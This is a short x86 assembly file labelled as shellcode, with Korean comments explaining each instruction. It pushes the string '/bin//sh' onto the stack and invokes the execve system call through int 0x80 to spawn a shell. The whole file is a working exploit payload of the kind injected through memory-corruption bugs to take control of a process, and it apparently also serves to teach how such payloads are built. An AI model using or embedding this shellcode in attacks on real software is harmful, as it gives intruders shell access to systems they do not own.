# Author : superdk@hanmail.net
# DATA : shellcode
# LICENSE : GNU License

.global _start

_start:
	xor %eax, %eax # EAX 레지스터를 0으로 초기화
	xor %edx, %edx # EDX 레지스터를 0으로 초기화
	
	# 첫 번째 인자인 "/bin//sh" 문자열을 조합
	push %eax # NULL(=0)으로 문자열 끝을 표시
	push $0x68732f2f # "//sh" 문자열을 스택에 푸시
	push $0x6e69622f # "/bin" 문자열을 스택에 푸시
	mov %esp, %ebx # "/bin//sh" 문자열의 주소를 저장
	
	# 두 번째 인자인 "/bin//sh" 문자열을 조합
	push %edx # NULL(=0)으로 문자열 끝을 표시
	push %ebx # "/bin//sh" 문자열의 주소를 푸시
	mov %esp, %ecx # "/bin//sh" 문자열의 주소를 ECX에 저장
	
	# execve 함수 호출
	movb $0x0B, %al # 0x0B(=11)
	int $0x80